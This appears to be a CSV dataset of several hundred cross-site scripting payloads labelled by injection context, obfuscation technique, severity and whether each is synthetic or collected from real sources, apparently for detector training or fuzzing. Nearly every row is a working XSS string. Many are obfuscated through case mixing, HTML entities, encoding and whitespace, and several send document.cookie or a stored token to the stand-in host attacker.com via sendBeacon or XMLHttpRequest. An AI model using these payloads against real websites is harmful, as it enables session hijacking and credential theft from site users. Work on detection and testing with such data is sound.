payload,context,technique,severity,length,source
"\"" OntRanSitIonRun=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))//",attribute_escape,synthetic,high,63,synthetic
`><Img srC=x onAuxCliCk=AleRt(1)>,attribute_escape,synthetic,medium,33,synthetic
<textarea src=x onscrollend=alert(%27XSS%27)>,tag_injection,synthetic,medium,45,synthetic
&quOt; onInpUt=ConSolE.lOg(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,52,synthetic
{{{alert(document.cookie)}}},template_injection,synthetic,high,28,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnsOle.loG(lOcaTioN.hAsh)>""",dom_sink,synthetic,high,72,synthetic
"<meta oncut=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",tag_injection,none,medium,59,real
javascr	ipt:console.log(document.domain),js_uri,synthetic,medium,40,synthetic
"(n&#101;w Function(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)""))();",dom_sink,synthetic,low,98,synthetic
%22 ><svg onmouseover=prompt(1)>,attribute_escape,synthetic,medium,32,synthetic
 onKeyDowN=cOnfIrm(1),event_handler,synthetic,medium,21,synthetic
"__proto__[%22ongotpointercapture%22]=console.log(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,79,synthetic
\' OnrEpeAt=AleRt(LocAtiOn.HasH)//,attribute_escape,synthetic,medium,34,synthetic
'><img src=x onwh&#101;&#101;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,61,synthetic
oninput=prompt&#40;location.hash&#41;,event_handler,synthetic,low,37,synthetic
><script>alert(123);</script x=,script_injection,none,medium,31,real
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionend=alert(1)></head>",tag_injection,none,medium,106,real
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></rt>",tag_injection,none,medium,164,real
%3Carea	onload=console.log(document.domain)%3E,tag_injection,synthetic,medium,46,synthetic
\%27 onwheel=prompt(location.hash)//,attribute_escape,synthetic,medium,36,synthetic
<seT x=y OnwEbkItfUllScrEenChaNge=coNsoLe.Log('XSS')>,tag_injection,synthetic,medium,53,synthetic
OnwEbkItfUllScrEenChaNge=jaVasCriPt:ProMpt(1),event_handler,synthetic,medium,45,synthetic
 oncontextmenu=alert('XSS'),event_handler,synthetic,medium,27,synthetic
"OngEstUreEnd=coNfiRm/***/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
"<input onmousemove=""alert(1)"">AnonKryptiQuz</input>",tag_injection,none,medium,51,real
<%= prompt(document.domain) %>,template_injection,synthetic,medium,30,synthetic
OnaNimAtiOneNd=AleRt(1),event_handler,synthetic,medium,23,synthetic
<tiTle	onBluR=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"\"" OnfOcuS=aLerT(1)//",attribute_escape,synthetic,medium,21,synthetic
	onscrollsnapchange=alert(location.hash),event_handler,synthetic,medium,40,synthetic
"s&#101;tTim&#101;out(""&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"",0)",dom_sink,synthetic,low,141,synthetic
"setTimeout(""XMLHttpRequest(document.domain)"",0)",dom_sink,synthetic,high,47,synthetic
"' onended=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,48,synthetic
<maTh	OndRagOveR=pRomPt(1)>,tag_injection,synthetic,medium,27,synthetic
<select	onanimationstart=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
ontr&#97;nsitionrun=&#97;l&#101;rt/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,64,synthetic
%22 ><svg ontouchstart=prompt(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
\%22 oncopy=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,36,synthetic
' oNtoGglE=cOnsOle.loG('XSS') ',attribute_escape,synthetic,medium,31,synthetic
"<input2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</input2>",tag_injection,none,medium,90,real
"""><script>alert(1)</script><""",script_injection,none,medium,29,real
' oNreSet=prOmpT(lOcaTioN.hAsh) ',attribute_escape,synthetic,medium,33,synthetic
"onp&#97;g&#101;r&#101;v&#101;&#97;l=j&#97;v&#97;script:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,102,synthetic
"<input3 onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></input3>",tag_injection,none,medium,285,real
""" ><svg onpromptdismiss=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=print()></a>",tag_injection,none,low,104,real
#\u0061lert(document.cookie),template_injection,synthetic,high,28,synthetic
<math oninvalid=confirm('XSS') oninvalid=confirm('XSS')>,tag_injection,synthetic,medium,56,synthetic
""" ><svg onbegin=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,53,synthetic
<noscript ongesturestart=alert('XSS') ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,66,synthetic
' %3E%3Csvg onanimationiteration=console.log(document.domain)%3E,attribute_escape,synthetic,medium,64,synthetic
"""%3E%3Cimg src=x onplay=confirm('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
""" ><svg onpl&#97;y=confirm('XSS')>",attribute_escape,synthetic,medium,34,synthetic
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>",js_uri,comment_injection,medium,141,real
"<frame onclick=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,67,real
"<b ondblclick=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,42,real
onpageshow=javascript:confirm(1),event_handler,synthetic,medium,32,synthetic
"<style>:target {color:red;}</style><meta id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></meta>",tag_injection,none,medium,112,real
\' OnaNimAtiOniTerAtiOn=ConSolE.lOg(DocUmeNt.DomAin)//,attribute_escape,synthetic,medium,54,synthetic
<%= alErt doCumEnt.doMaiN %>,template_injection,synthetic,low,28,synthetic
__proto__[%22onanimationstart%22]=console.log(document.cookie),dom_sink,synthetic,high,62,synthetic
<set/onclose=confirm(document.domain)>,tag_injection,synthetic,medium,38,synthetic
"%22 ondragover=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,61,synthetic
"<label onclick=""alert(1)"" style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,67,real
	onpaste=prompt(document.domain),event_handler,synthetic,medium,32,synthetic
<menu onpointerleave=alert(1) style=display:block>AnonKryptiQuz</menu>,tag_injection,none,medium,70,real
<del onpointerenter=alert(1) style=display:block>AnonKryptiQuz</del>,tag_injection,none,medium,68,real
"<script ,>alert()</script>",script_injection,none,medium,26,real
"<aside onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</aside>",tag_injection,none,medium,68,real
onfocusin=confirm(document.domain),event_handler,synthetic,medium,34,synthetic
`><img src=x ondrop=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,38,synthetic
"\"" onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,70,synthetic
' ><svg ontouch&#101;nd=prompt('XSS')>,attribute_escape,synthetic,medium,38,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=j&#97;v&#97;script:prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,89,synthetic
"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",tag_injection,none,medium,107,real
<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>,generic,none,medium,52,real
' onmous&#101;ov&#101;r=confirm('XSS') ',attribute_escape,synthetic,medium,40,synthetic
' %3E%3Csvg onpointerover=confirm(location.hash)%3E,attribute_escape,synthetic,medium,51,synthetic
"\%27 ongotpointercapture=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,65,synthetic
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,generic,html_entity,medium,141,real
%3Ctd/onwebkitanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,43,synthetic
	onb&#101;for&#101;input=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,57,synthetic
"<button oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</button>",tag_injection,none,medium,64,real
"location.href=""javascript:XMLHttpRequest(btoa(document.cookie))""",dom_sink,synthetic,high,64,synthetic
`><Img srC=x onErrOr=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('AnonKryptiQuz')&lt;/SCRIPT&gt;\""&gt;",event_handler,none,medium,109,real
"<nav onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</nav>",tag_injection,none,medium,66,real
j&#97;v&#97;script:confirm/***/(docum&#101;nt.dom&#97;in),js_uri,synthetic,low,57,synthetic
<!--><TexTarEa OnsCroLleNd=AleRt('XSS')>,tag_injection,synthetic,medium,40,synthetic
<s&#101;l&#101;ct onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1) onvolum&#101;ch&#97;ng&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,116,synthetic
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=print()></u>",tag_injection,none,low,119,real
 onMouSeeNteR=aLerT(lOcaTioN.hAsh),event_handler,synthetic,medium,34,synthetic
" onbeforetoggle=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,54,synthetic
"<small draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</small>",tag_injection,none,medium,68,real
"location=""javascr	ipt:alert('XSS')""",dom_sink,synthetic,high,35,synthetic
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",tag_injection,none,medium,112,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""print()""></big>",tag_injection,none,low,175,real
%27 ><svg oncontextmenu=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
<img src=x onerror=alert('AnonKryptiQuz');>,tag_injection,none,medium,43,real
"<bdi onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</bdi>",tag_injection,none,medium,67,real
"Obj&#101;ct.&#97;ssign(window,{""onpl&#97;y"":&#101;v&#97;l})",dom_sink,synthetic,low,59,synthetic
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,dom_sink,none,medium,236,real
<vid&#101;o onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection,synthetic,medium,67,synthetic
""" ><svg onvolum&#101;ch&#97;ng&#101;=confirm('XSS')>",attribute_escape,synthetic,medium,52,synthetic
%22 ><svg onbeforematch=alert(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
' ><svG oNblUr=ProMpt('XSS')>,attribute_escape,synthetic,medium,29,synthetic
'><img src=x onend=console.log('XSS')>,attribute_escape,synthetic,medium,38,synthetic
<dialog open onclose=alert(1)><form method=dialog><button>AnonKryptiQuz</button></form>,tag_injection,none,medium,87,real
"<nobr onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,68,real
&quOt; onSeaRch=prOmpT(dOcuMenT.dOmaIn) x=&quOt;,attribute_escape,synthetic,medium,48,synthetic
""" ><svg ong&#101;stur&#101;&#101;nd=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,60,synthetic
"<map onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</map>",tag_injection,none,medium,68,real
"\"" onk&#101;ydown=&#97;l&#101;rt('XSS')//",attribute_escape,synthetic,low,41,synthetic
""" onended=alert('XSS') """,attribute_escape,synthetic,medium,24,synthetic
<abbr onpointerleave=alert(1) style=display:block>AnonKryptiQuz</abbr>,tag_injection,none,medium,70,real
{{prompt %27XSS%27}},template_injection,synthetic,low,20,synthetic
<script>console.log(location.hash)</script>,script_injection,synthetic,medium,43,synthetic
"setInterval(""prompt(document.cookie)"",100)",dom_sink,synthetic,high,42,synthetic
"' onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,low,99,synthetic
"""><img src=/x onerror=prompt(document.domain);>",dom_sink,none,medium,47,real
"<style>:target {color:red;}</style><section id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></section>",tag_injection,none,medium,118,real
eval(%22alert(%27//attacker.com/?c=%27+document.cookie)%22),dom_sink,synthetic,high,59,synthetic
"<td onmouseout=""alert(1)"">AnonKryptiQuz</td>",tag_injection,none,medium,44,real
"<obJecT
oNvoLumEchAngE=aLerT(1)>",tag_injection,synthetic,medium,32,synthetic
\' OnpRomPtaCtiOn=ProMpt(loCatIon.haSh)//,attribute_escape,synthetic,medium,41,synthetic
<svg><hgroup onload=alert(1)></hgroup>,tag_injection,none,medium,38,real
""" onfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(1) """,attribute_escape,synthetic,low,61,synthetic
"<summary onclick=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,51,real
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",tag_injection,none,medium,103,real
onmozfullscreenchange=prompt/***/('XSS'),event_handler,synthetic,low,40,synthetic
\' OnpOpsTatE=aLerT('XSS')//,attribute_escape,synthetic,medium,28,synthetic
<input4 onpointerover=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,73,real
"<acronym oncontextmenu=""alert(1)"">AnonKryptiQuz</acronym>",tag_injection,none,medium,57,real
"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable style=display:block>drop here</h1>",tag_injection,none,medium,121,real
%22><img src=x onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,64,synthetic
"ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,88,synthetic
"OniNpuT=aLerT/***/(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,49,synthetic
%27 ><svg onpopstate=alert(location.hash)>,attribute_escape,synthetic,medium,42,synthetic
"<dl onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</dl>",tag_injection,none,medium,66,real
"LocAtiOn.HreF=""JavAscRipT:aLerT('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink,synthetic,high,70,synthetic
"""><img src=x ondrop=prompt('XSS')>",attribute_escape,synthetic,medium,34,synthetic
<plaintext/ontouchstart=alert(1)>,tag_injection,synthetic,medium,33,synthetic
"LocAtiOn=""jaVasCriPt:ProMpt(loCalStoRagE.gEtITem('tOkeN'))""",dom_sink,synthetic,high,59,synthetic
"<object onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</object>",tag_injection,none,medium,71,real
"<auDio
onMouSeoVer=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,38,synthetic
"<sub onclick=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,43,real
<ol onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
' onended=\u0061lert(1) ',attribute_escape,synthetic,low,25,synthetic
<select onpointermove=prompt('XSS')>,tag_injection,synthetic,medium,36,synthetic
"\"" onmozfullscreenchange=alert(1)//",attribute_escape,synthetic,medium,35,synthetic
"\"" ons&#101;l&#101;ct=prompt(1)//",attribute_escape,synthetic,medium,33,synthetic
"""%3E%3Cimg src=x ondblclick=console.log(location.hash)%3E",attribute_escape,synthetic,medium,57,synthetic
{{ alert(document.cookie) }},template_injection,synthetic,high,28,synthetic
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",generic,case_variation,medium,53,real
<b&#97;s&#101;/ong&#101;stur&#101;&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,86,synthetic
"<script>confirm`String.fromCharCode(88,83,83)`</script>",script_injection,synthetic,high,55,synthetic
"\"" onp&#97;us&#101;=consol&#101;.log('XSS')//",attribute_escape,synthetic,low,45,synthetic
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dd>",tag_injection,none,medium,108,real
"<frame ondblclick=""alert(1)"">AnonKryptiQuz</frame>",tag_injection,none,medium,50,real
onbeforetoggle=\u0061lert/**/(location.hash),event_handler,synthetic,low,44,synthetic
onend=javascr	ipt:prompt(location.hash),event_handler,synthetic,medium,39,synthetic
"__proto__[""onb&#101;for&#101;copy""]=consol&#101;.log(loc&#97;tion.h&#97;sh)",dom_sink,synthetic,low,75,synthetic
<base onkeydown=alert('XSS')/>,tag_injection,synthetic,medium,30,synthetic
%22 ontouchend=prompt(%27XSS%27) %22,attribute_escape,synthetic,medium,36,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onpoint&#101;rdown"":consol&#101;.log})",dom_sink,synthetic,low,70,synthetic
"__proto__[""ontouchmove""]=alert(document.domain)",dom_sink,synthetic,medium,47,synthetic
{{$On.ConStrUctOr('coNfiRm(DocUmeNt.DomAin)')()}},template_injection,synthetic,medium,49,synthetic
""" ><svg onanimationend=confirm(1)>",attribute_escape,synthetic,medium,34,synthetic
'><Img srC=x onAniMatIonEnd=coNfiRm(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,53,synthetic
\' ons&#101;&#97;rch=&#97;l&#101;rt(1)//,attribute_escape,synthetic,low,40,synthetic
"<nav onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",tag_injection,none,medium,63,real
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(0260)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
`><img src=x onpagehide=alert(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
"${{'prOmpT(1)'.RepLacE('ProMpt(1)','')}}",template_injection,synthetic,medium,40,synthetic
"""`'><script>\x0Bjavascript:alert(0186)</script>",script_injection,none,medium,47,real
"__proto__[""oncut""]=&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,133,synthetic
"&quot; onmous&#101;up=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,medium,77,synthetic
"`><Img srC=x onMozFulLscReeNchAngE=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
%3Cbase oninput=alert('XSS') oninput=alert('XSS')%3E,tag_injection,synthetic,medium,52,synthetic
"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdo>",tag_injection,none,medium,166,real
<mtext/onstalled=console.log(document.domain)>,tag_injection,synthetic,medium,46,synthetic
"<marquee onpromptdismiss=console.log(String.fromCharCode(88,83,83)) onpromptdismiss=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,127,synthetic
OnmOusEdoWn=JavAscRipT:aLerT(1),event_handler,synthetic,medium,31,synthetic
"' ><svg onplaying=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
"<menu oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
"<b onmouseup=""alert(1)"">AnonKryptiQuz</b>",tag_injection,none,medium,41,real
"<style>:target {color: red;}</style><u id=x style=""transition:color 10s"" ontransitioncancel=print()></u>",tag_injection,none,low,104,real
" onFulLscReeNchAngE=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,56,synthetic
<img src=validimage.png onload=alert(1)>,tag_injection,none,medium,40,real
'><img src=x onfocus=console.log(1)>,attribute_escape,synthetic,medium,36,synthetic
%22 onfocus=confirm(location.hash) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
"__proto__[""onclick""]=XMLHttpRequest('//attacker.com/?c='+document.cookie)",dom_sink,synthetic,high,73,synthetic
<&#97;nim&#97;t&#101;tr&#97;nsform	onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,83,synthetic
 ondblclick=console.log(1),event_handler,synthetic,medium,26,synthetic
{alert('document.cookie')},dom_sink,none,high,26,real
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;us&#101;"":f&#101;tch})",dom_sink,synthetic,low,62,synthetic
{alErt doCumEnt.doMaiN},template_injection,synthetic,low,23,synthetic
`%3E%3Cimg src=x onbeforecopy=prompt(location.hash)%3E,attribute_escape,synthetic,medium,54,synthetic
"onscrollsnapchange=confirm/***/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,62,synthetic
"setTimeout(%22fetch(%27XSS%27)%22,0)",dom_sink,synthetic,high,36,synthetic
ondr&#97;gov&#101;r=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,49,synthetic
 onbeforecopy=alert(document.domain),event_handler,synthetic,medium,36,synthetic
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",tag_injection,none,medium,101,real
&lt;BODY ONLOAD=alert('AnonKryptiQuz')&gt;,event_handler,none,medium,42,real
{alert document.cookie},template_injection,synthetic,high,23,synthetic
"<animatemotion
onsecuritypolicyviolation=console.log(%27XSS%27)>",tag_injection,synthetic,medium,64,synthetic
"s&#101;tTim&#101;out(""&#101;v&#97;l(1)"",0)",dom_sink,synthetic,low,42,synthetic
"`%3E%3Cimg src=x onvolumechange=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,72,synthetic
<svg><wbr onload=alert(1)></wbr>,tag_injection,none,medium,32,real
<di&#97;log src=x onp&#97;g&#101;hid&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,63,synthetic
"<fieldset oncontextmenu=""alert(1)"">AnonKryptiQuz</fieldset>",tag_injection,none,medium,59,real
#&#97;l&#101;rt(docum&#101;nt.cooki&#101;),template_injection,synthetic,low,42,synthetic
"<dialog draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",tag_injection,none,medium,88,real
<form	onwebkitanimationend=prompt('XSS')>,tag_injection,synthetic,medium,41,synthetic
' %3E%3Csvg onrepeat=alert(location.hash)%3E,attribute_escape,synthetic,medium,44,synthetic
[45].some.alert(),generic,none,medium,17,real
"element.setAttribute(""onclick"",""alert(btoa(document.cookie))"")",dom_sink,synthetic,high,62,synthetic
"%3Cxmp src=x ontouchend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,69,synthetic
"<sub draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</sub>",tag_injection,none,medium,59,real
<&#97;nim&#97;t&#101;motion	onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,80,synthetic
<!--><t&#101;mpl&#97;t&#101; onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,85,synthetic
"""%3E%3Cimg src=x onerror=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,64,synthetic
<!--><select onpromptdismiss=console.log(1)>,tag_injection,synthetic,medium,44,synthetic
"%3Ctemplate
onreset=alert(location.hash)%3E",tag_injection,synthetic,medium,43,synthetic
' ><svg ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,83,synthetic
&quot; ontransitionend=alert(1) x=&quot;,attribute_escape,synthetic,medium,40,synthetic
'%3E%3Cimg src=x onanimationend=confirm(document.domain)%3E,attribute_escape,synthetic,medium,59,synthetic
%27 ><svg ongestureend=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
<multicol onpointerdown=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,77,real
OnpOinTerRawUpdAte=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,53,synthetic
`><img src=x onmous&#101;wh&#101;&#101;l=consol&#101;.log(1)>,attribute_escape,synthetic,low,61,synthetic
"<output onmousedown=""alert(1)"">AnonKryptiQuz</output>",tag_injection,none,medium,53,real
<video onmozfullscreenchange=prompt(%27XSS%27)/>,tag_injection,synthetic,medium,48,synthetic
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",generic,encoding,high,76,real
__proto__[%22onscrollend%22]=prompt(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,78,synthetic
<&#97;nim&#97;t&#101;motion	on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')>,tag_injection,synthetic,low,90,synthetic
"<div onp&#97;us&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,70,synthetic
onanimationend=javascript:console.log('XSS'),event_handler,synthetic,medium,44,synthetic
%27 ondrop=confirm(document.domain) %27,attribute_escape,synthetic,medium,39,synthetic
"onfocusout=console.log/*x*/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,58,synthetic
"""><area onload=console.log(document.domain)>",tag_injection,synthetic,medium,44,synthetic
"<a href=""\xE2\x80\x80javascript:javascript:alert(7838)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
%27 oncut=console.log(1) %27,attribute_escape,synthetic,medium,28,synthetic
"<scr	ipt>setTimeout('prompt(document.domain)',0)</scr	ipt>",script_injection,synthetic,medium,58,synthetic
"<animatetransform oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,109,real
{{constructor.constructor(‘alert(1)’)()}},template_injection,none,medium,41,real
\%22 oncut=confirm(%27XSS%27)//,attribute_escape,synthetic,medium,31,synthetic
""" ><svg onfullscreenchange=\u0061lert(location.hash)>",attribute_escape,synthetic,low,53,synthetic
"<custom tags onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",tag_injection,none,medium,83,real
<seLecT/oNmoUseWheEl=AleRt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,44,synthetic
javascript:\u0061lert/***/(document.domain),js_uri,synthetic,low,43,synthetic
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,script_injection,case_variation,medium,39,real
`><Img srC=x onPopStaTe=AleRt('XSS')>,attribute_escape,synthetic,medium,37,synthetic
#&lt;img&#47;src&#47;onerror=alert(`AnonKryptiQuz`)&gt;,event_handler,html_entity,medium,55,real
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></keygen>",tag_injection,none,medium,116,real
